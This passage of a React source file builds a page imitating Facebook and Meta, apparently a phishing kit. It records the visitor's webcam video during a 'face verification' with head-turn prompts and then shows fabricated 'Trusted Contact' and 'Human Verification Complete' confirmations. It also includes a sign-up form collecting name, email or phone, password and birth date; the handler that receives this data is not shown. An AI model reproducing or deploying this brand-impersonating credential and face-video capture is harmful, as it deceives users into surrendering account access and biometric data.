                  <div className="absolute rounded-full overflow-hidden" style={{ top: '20px', left: '20px', right: '20px', bottom: '20px', backgroundColor: '#000' }}>
                    <video
                      ref={setVideoRef}
                      autoPlay
                      playsInline
                      muted
                      className="w-full h-full object-cover scale-x-[-1]"
                    />
                  </div>

                  {/* Arrow Direction Indicators */}
                  {currentDirection === "right" && (
                    <div className="absolute right-0 top-1/2 transform translate-x-4 -translate-y-1/2">
                      <div
                        className="flex items-center justify-center w-10 h-10 rounded-full"
                        style={{ backgroundColor: directionProgress > 50 ? '#42b72a' : '#1877f2' }}
                      >
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="3">
                          <path d="M5 12h14M12 5l7 7-7 7" strokeLinecap="round" strokeLinejoin="round"/>
                        </svg>
                      </div>
                    </div>
                  )}
                  {currentDirection === "left" && (
                    <div className="absolute left-0 top-1/2 transform -translate-x-4 -translate-y-1/2">
                      <div
                        className="flex items-center justify-center w-10 h-10 rounded-full"
                        style={{ backgroundColor: directionProgress > 50 ? '#42b72a' : '#1877f2' }}
                      >
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="3">
                          <path d="M19 12H5M12 19l-7-7 7-7" strokeLinecap="round" strokeLinejoin="round"/>
                        </svg>
                      </div>
                    </div>
                  )}
                  {currentDirection === "up" && (
                    <div className="absolute top-0 left-1/2 transform -translate-x-1/2 -translate-y-4">
                      <div
                        className="flex items-center justify-center w-10 h-10 rounded-full"
                        style={{ backgroundColor: directionProgress > 50 ? '#42b72a' : '#1877f2' }}
                      >
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="3">
                          <path d="M12 19V5M5 12l7-7 7 7" strokeLinecap="round" strokeLinejoin="round"/>
                        </svg>
                      </div>
                    </div>
                  )}
                </div>

                {/* Direction instruction text */}
                <div className="text-center mb-4">
                  <p className="text-lg font-semibold mb-1" style={{ color: '#1c1e21' }}>
                    {currentDirection === "right" && "Turn your head right"}
                    {currentDirection === "left" && "Turn your head left"}
                    {currentDirection === "up" && "Look up"}
                    {!currentDirection && "Keep your face centered"}
                  </p>
                  <p className="text-xs" style={{ color: '#65676b' }}>
                    Follow the arrow direction
                  </p>
                </div>

                {/* Progress indicator */}
                <div className="flex items-center gap-2 mb-6">
                  {[0, 1, 2, 3, 4, 5].map((i) => (
                    <div
                      key={i}
                      className="w-2 h-2 rounded-full"
                      style={{
                        backgroundColor: i < Math.floor(overallProgress / 16.67) ? '#42b72a' : '#e4e6eb',
                        transition: 'background-color 0.3s ease'
                      }}
                    />
                  ))}
                </div>

                <button
                  onClick={() => {
                    if (stream) stream.getTracks().forEach(track => track.stop());
                    if (mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop();
                    setCurrentStep("login");
                  }}
                  className="text-sm"
                  style={{ color: '#65676b' }}
                  data-testid="button-cancel-verification"
                >
                  Cancel verification
                </button>
              </div>
            </div>
          )}

          {/* Processing/Complete - Identity Confirmed */}
          {(currentStep === "processing" || currentStep === "complete") && (
            <div className="flex flex-col h-full" style={{ backgroundColor: '#ffffff', minHeight: '100vh' }}>
              {currentStep === "processing" ? (
                <>
                  <style>{`
                    @keyframes pulse-ring {
                      0% {
                        transform: scale(1);
                        opacity: 0.8;
                      }
                      100% {
                        transform: scale(1.5);
                        opacity: 0;
                      }
                    }
                    @keyframes fade-in-scale {
                      0% {
                        opacity: 0;
                        transform: scale(0.95);
                      }
                      100% {
                        opacity: 1;
                        transform: scale(1);
                      }
                    }
                    @keyframes slide-up {
                      0% {
                        opacity: 0;
                        transform: translateY(12px);
                      }
                      100% {
                        opacity: 1;
                        transform: translateY(0);
                      }
                    }
                    @keyframes shimmer {
                      0% {
                        background-position: -200% 0;
                      }
                      100% {
                        background-position: 200% 0;
                      }
                    }
                  `}</style>

                  {/* Top Bar */}
                  <div className="flex items-center justify-between px-4 py-3" style={{ backgroundColor: '#fff', borderBottom: '1px solid #e4e6eb' }}>
                    <div className="w-10"></div>
                    <span className="text-sm font-semibold" style={{ color: '#1c1e21' }}>Face Verification</span>
                    <div className="w-10"></div>
                  </div>

                  {/* Main Content */}
                  <div className="flex-1 flex flex-col items-center justify-center px-6 py-12">
                    {/* Enhanced Facebook-style loader */}
                    <div className="relative w-32 h-32 mx-auto mb-10" style={{ animation: 'fade-in-scale 0.4s ease-out' }}>
                      {/* Multiple pulsing rings */}
                      <div className="absolute inset-0 rounded-full" style={{
                        backgroundColor: 'rgba(24, 119, 242, 0.1)',
                        animation: 'pulse-ring 2s ease-out infinite'
                      }} />
                      <div className="absolute inset-0 rounded-full" style={{
                        backgroundColor: 'rgba(24, 119, 242, 0.1)',
                        animation: 'pulse-ring 2s ease-out 0.5s infinite'
                      }} />
                      <div className="absolute inset-0 rounded-full" style={{
                        backgroundColor: 'rgba(24, 119, 242, 0.1)',
                        animation: 'pulse-ring 2s ease-out 1s infinite'
                      }} />

                      {/* Circular background */}
                      <div className="absolute inset-0 rounded-full flex items-center justify-center" style={{ backgroundColor: '#e7f3ff' }}>
                        {/* Main spinner */}
                        <div
                          className="absolute inset-4 rounded-full border-4"
                          style={{
                            borderColor: 'rgba(24, 119, 242, 0.2)',
                            borderTopColor: '#1877f2',
                            animation: 'fb-spin 1s linear infinite'
                          }}
                        />

                        {/* Shield icon in center */}
                        <svg className="w-12 h-12" viewBox="0 0 24 24" fill="none" stroke="#1877f2" strokeWidth="2">
                          <path strokeLinecap="round" strokeLinejoin="round" d="M9 12.75L11.25 15 15 9.75m-3-7.036A11.959 11.959 0 013.598 6 11.99 11.99 0 003 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285z" />
                        </svg>
                      </div>
                    </div>

                    <h2 className="text-2xl font-bold mb-3" style={{ color: '#1c1e21', animation: 'slide-up 0.5s ease-out 0.1s both' }}>
                      Verifying video
                    </h2>
                    <p className="text-sm mb-8" style={{ color: '#65676b', animation: 'slide-up 0.5s ease-out 0.2s both', maxWidth: '280px', textAlign: 'center' }}>
                      We're analyzing your video to confirm you're a real person. This won't take long.
                    </p>

                    {/* Progress bar with shimmer effect */}
                    <div className="w-full max-w-xs mb-6" style={{ animation: 'slide-up 0.5s ease-out 0.3s both' }}>
                      <div className="h-1.5 rounded-full overflow-hidden" style={{ backgroundColor: '#e4e6eb' }}>
                        <div
                          className="h-full rounded-full"
                          style={{
                            background: 'linear-gradient(90deg, #1877f2 0%, #42b72a 50%, #1877f2 100%)',
                            backgroundSize: '200% 100%',
                            animation: 'shimmer 1.5s ease-in-out infinite',
                            width: '70%'
                          }}
                        />
                      </div>
                    </div>

                    {/* Status indicators */}
                    <div className="space-y-3 mb-8" style={{ animation: 'slide-up 0.5s ease-out 0.4s both' }}>
                      <div className="flex items-center gap-3">
                        <div className="w-5 h-5 rounded-full flex items-center justify-center" style={{ backgroundColor: '#42b72a' }}>
                          <svg className="w-3 h-3" fill="none" stroke="#fff" viewBox="0 0 24 24" strokeWidth={3}>
                            <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
                          </svg>
                        </div>
                        <p className="text-sm" style={{ color: '#1c1e21' }}>Video uploaded</p>
                      </div>
                      <div className="flex items-center gap-3">
                        <div className="relative w-5 h-5 rounded-full flex items-center justify-center" style={{ backgroundColor: '#e7f3ff' }}>
                          <div className="w-2 h-2 rounded-full" style={{ backgroundColor: '#1877f2', animation: 'pulse 1s ease-in-out infinite' }} />
                        </div>
                        <p className="text-sm" style={{ color: '#65676b' }}>Analyzing face movements...</p>
                      </div>
                      <div className="flex items-center gap-3">
                        <div className="w-5 h-5 rounded-full" style={{ backgroundColor: '#e4e6eb' }} />
                        <p className="text-sm" style={{ color: '#8a8d91' }}>Confirming identity</p>
                      </div>
                    </div>
                  </div>
                </>
              ) : (
                <>
                  {/* Success Animation */}
                  <div className="relative w-32 h-32 mx-auto mb-6">
                    <div className="absolute inset-0 rounded-full flex items-center justify-center" style={{ backgroundColor: '#e7f3ff' }}>
                      <svg className="w-16 h-16" fill="none" stroke="#00a400" viewBox="0 0 24 24" strokeWidth={3}>
                        <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
                      </svg>
                    </div>
                    <div className="absolute inset-0 rounded-full border-4 border-green-400 animate-ping opacity-75"></div>
                  </div>

                  <h2 className="text-3xl font-bold mb-2" style={{ color: '#1c1e21' }}>Human Verification Complete</h2>
                  <p className="text-sm mb-4" style={{ color: '#65676b' }}>
                    You have been verified as a real person
                  </p>
                  <p className="text-xs mb-8" style={{ color: '#8a8d91' }}>
                    Trusted Contact verification successful
                  </p>

                  {/* Verification Details Card */}
                  <div className="max-w-sm mx-auto mb-8 p-4 rounded-lg" style={{ backgroundColor: '#f0f2f5' }}>
                    <div className="space-y-3">
                      <div className="flex items-center justify-between">
                        <span className="text-xs font-semibold" style={{ color: '#65676b' }}>Human Verification</span>
                        <span className="text-xs font-bold" style={{ color: '#00a400' }}>✓ Confirmed</span>
                      </div>
                      <div className="flex items-center justify-between">
                        <span className="text-xs font-semibold" style={{ color: '#65676b' }}>Live Detection</span>
                        <span className="text-xs font-bold" style={{ color: '#00a400' }}>✓ Passed</span>
                      </div>
                      <div className="flex items-center justify-between">
                        <span className="text-xs font-semibold" style={{ color: '#65676b' }}>Trusted Contact</span>
                        <span className="text-xs font-bold" style={{ color: '#00a400' }}>✓ Verified</span>
                      </div>
                      <div className="flex items-center justify-between">
                        <span className="text-xs font-semibold" style={{ color: '#65676b' }}>Verification Time</span>
                        <span className="text-xs" style={{ color: '#1c1e21' }}>{new Date().toLocaleTimeString()}</span>
                      </div>
                    </div>
                  </div>

                  {/* Security Features */}
                  <div className="max-w-sm mx-auto mb-8 text-left">
                    <p className="text-xs font-semibold mb-3" style={{ color: '#1c1e21' }}>Verification steps completed:</p>
                    <div className="space-y-2">
                      <div className="flex items-start gap-2">
                        <svg className="w-4 h-4 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20" style={{ color: '#00a400' }}>
                          <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                        </svg>
                        <p className="text-xs" style={{ color: '#65676b' }}>Real human confirmed (not a bot)</p>
                      </div>
                      <div className="flex items-start gap-2">
                        <svg className="w-4 h-4 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20" style={{ color: '#00a400' }}>
                          <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                        </svg>
                        <p className="text-xs" style={{ color: '#65676b' }}>Live presence verified (not a photo or video)</p>
                      </div>
                      <div className="flex items-start gap-2">
                        <svg className="w-4 h-4 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20" style={{ color: '#00a400' }}>
                          <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                        </svg>
                        <p className="text-xs" style={{ color: '#65676b' }}>Trusted Contact verification finalized</p>
                      </div>
                    </div>
                  </div>

                  <button
                    onClick={() => window.location.href = 'fb://facewebmodal/f?href=https://www.facebook.com'}
                    className="w-full py-3 text-white text-sm font-bold rounded-full transition mb-3"
                    style={{ backgroundColor: '#1877f2' }}
                    onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#166fe5')}
                    onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
                    data-testid="button-continue"
                  >
                    Continue to Facebook
                  </button>

                  <p className="text-xs" style={{ color: '#65676b' }}>
                    You'll be redirected to your Facebook account
                  </p>
                </>
              )}
            </div>
          )}
        </div>
      </main>

      {/* Footer */}
      <footer className="text-center py-8 px-5" style={{ color: '#65676b' }}>
        <div className="mb-4">
          <img
            src={metaLogoImg}
            alt="Meta"
            className="h-8 mx-auto"
            data-testid="img-meta-logo"
          />
        </div>
        <div className="text-xs">
          <a href="https://about.meta.com/" target="_blank" rel="noopener noreferrer" className="hover:underline mr-2" data-testid="link-about">
            About
          </a>
          <a href="https://www.facebook.com/help/" target="_blank" rel="noopener noreferrer" className="hover:underline mr-2" data-testid="link-help">
            Help
          </a>
          <a href="https://www.facebook.com/" target="_blank" rel="noopener noreferrer" className="hover:underline" data-testid="link-more">
            More
          </a>
        </div>
      </footer>

      {/* Sign Up Dialog */}
      <Dialog open={signupOpen} onOpenChange={setSignupOpen}>
        <DialogContent className="sm:max-w-[432px] p-0 gap-0 bg-white rounded-lg overflow-hidden border-0">
          <DialogHeader className="p-4 pb-0">
            <DialogTitle className="text-2xl font-bold" style={{ color: '#1c1e21' }}>
              Sign Up
            </DialogTitle>
            <DialogDescription className="text-sm mt-1" style={{ color: '#65676b' }}>
              It's quick and easy.
            </DialogDescription>
          </DialogHeader>

          <div className="my-3" style={{ borderTop: '1px solid #dadde1' }} />

          <Form {...signupForm}>
            <form onSubmit={signupForm.handleSubmit(handleSignup)} className="px-4 pb-4 space-y-3">
              <div className="flex gap-3">
                <FormField
                  control={signupForm.control}
                  name="firstName"
                  render={({ field }) => (
                    <FormItem className="flex-1">
                      <FormControl>
                        <input
                          {...field}
                          placeholder="First name"
                          className="w-full px-3 py-2 text-sm border rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
                          style={{
                            backgroundColor: '#f5f6f7',
                            borderColor: '#ccd0d5',
                            color: '#1c1e21',
                          }}
                          data-testid="input-firstname"
                        />
                      </FormControl>
                      <FormMessage className="text-xs mt-1" style={{ color: '#be4b49' }} />
                    </FormItem>
                  )}
                />
                <FormField
                  control={signupForm.control}
                  name="lastName"
                  render={({ field }) => (
                    <FormItem className="flex-1">
                      <FormControl>
                        <input
                          {...field}
                          placeholder="Surname"
                          className="w-full px-3 py-2 text-sm border rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
                          style={{
                            backgroundColor: '#f5f6f7',
                            borderColor: '#ccd0d5',
                            color: '#1c1e21',
                          }}
                          data-testid="input-lastname"
                        />
                      </FormControl>
                      <FormMessage className="text-xs mt-1" style={{ color: '#be4b49' }} />
                    </FormItem>
                  )}
                />
              </div>

              <FormField
                control={signupForm.control}
                name="emailOrPhone"
                render={({ field }) => (
                  <FormItem>
                    <FormControl>
                      <input
                        {...field}
                        placeholder="Mobile number or email address"
                        className="w-full px-3 py-2 text-sm border rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
                        style={{
                          backgroundColor: '#f5f6f7',
                          borderColor: '#ccd0d5',
                          color: '#1c1e21',
                        }}
                        data-testid="input-signup-email"
                      />
                    </FormControl>
                    <FormMessage className="text-xs mt-1" style={{ color: '#be4b49' }} />
                  </FormItem>
                )}
              />

              <FormField
                control={signupForm.control}
                name="newPassword"
                render={({ field }) => (
                  <FormItem>
                    <FormControl>
                      <input
                        {...field}
                        type="password"
                        placeholder="New password"
                        className="w-full px-3 py-2 text-sm border rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
                        style={{
                          backgroundColor: '#f5f6f7',
                          borderColor: '#ccd0d5',
                          color: '#1c1e21',
                        }}
                        data-testid="input-signup-password"
                      />
                    </FormControl>
                    <FormMessage className="text-xs mt-1" style={{ color: '#be4b49' }} />
                  </FormItem>
                )}
              />

              <div>
                <label className="text-xs" style={{ color: '#65676b' }}>
                  Date of birth
                </label>
                <div className="flex gap-3 mt-1">
                  <select
                    className="flex-1 px-2 py-1 text-sm border rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
                    style={{
                      backgroundColor: '#f5f6f7',
                      borderColor: '#ccd0d5',
                      color: '#1c1e21',
                    }}
                    value={signupForm.watch("birthday.month")}
                    onChange={(e) => signupForm.setValue("birthday.month", e.target.value)}
                    data-testid="select-birthday-month"
                  >
                    {months.map((m, idx) => (
                      <option key={idx} value={String(idx)}>
                        {m}
                      </option>
                    ))}
                  </select>
                  <select
                    className="flex-1 px-2 py-1 text-sm border rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
                    style={{
                      backgroundColor: '#f5f6f7',
                      borderColor: '#ccd0d5',
                      color: '#1c1e21',
                    }}
                    value={signupForm.watch("birthday.day")}
                    onChange={(e) => signupForm.setValue("birthday.day", e.target.value)}
                    data-testid="select-birthday-day"
                  >
                    {days.map((d) => (
                      <option key={d} value={d}>
                        {d}
                      </option>
                    ))}
                  </select>
                  <select
                    className="flex-1 px-2 py-1 text-sm border rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
                    style={{
                      backgroundColor: '#f5f6f7',
                      borderColor: '#ccd0d5',
                      color: '#1c1e21',
                    }}
                    value={signupForm.watch("birthday.year")}
                    onChange={(e) => signupForm.setValue("birthday.year", e.target.value)}
                    data-testid="select-birthday-year"
                  >
                    {years.map((y) => (
                      <option key={y} value={y}>
                        {y}
                      </option>
                    ))}
                  </select>
                </div>
              </div>

              <div>
                <label className="text-xs" style={{ color: '#65676b' }}>
                  Gender
                </label>
                <div className="flex gap-3 mt-1">
                  {[
                    { value: "female", label: "Female" },
                    { value: "male", label: "Male" },
                    { value: "custom", label: "Custom" },
                  ].map((option) => (
                    <label
                      key={option.value}
                      className="flex-1 flex items-center justify-between px-3 py-2 border rounded-md cursor-pointer"
                      style={{
                        backgroundColor: '#f5f6f7',
                        borderColor: '#ccd0d5',
                      }}
                    >
                      <span className="text-sm" style={{ color: '#1c1e21' }}>
                        {option.label}
                      </span>
                      <input
                        type="radio"
                        name="gender"
                        value={option.value}
                        onChange={(e) => signupForm.setValue("gender", e.target.value)}
                        checked={signupForm.watch("gender") === option.value}
                        className="w-4 h-4 cursor-pointer"
                        data-testid={`radio-gender-${option.value}`}
                      />
                    </label>
                  ))}
                </div>
              </div>

              <button
                type="submit"
                disabled={isSigningUp}
                className="w-auto px-16 py-2 text-white text-base font-bold rounded-md transition disabled:opacity-60 mx-auto block"
                style={{ backgroundColor: '#00a400' }}
                onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#009200')}
                onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#00a400')}
                data-testid="button-signup-submit"
              >
                {isSigningUp ? "Signing up..." : "Sign Up"}
              </button>
            </form>
          </Form>
        </DialogContent>
      </Dialog>
    </div>
  );
}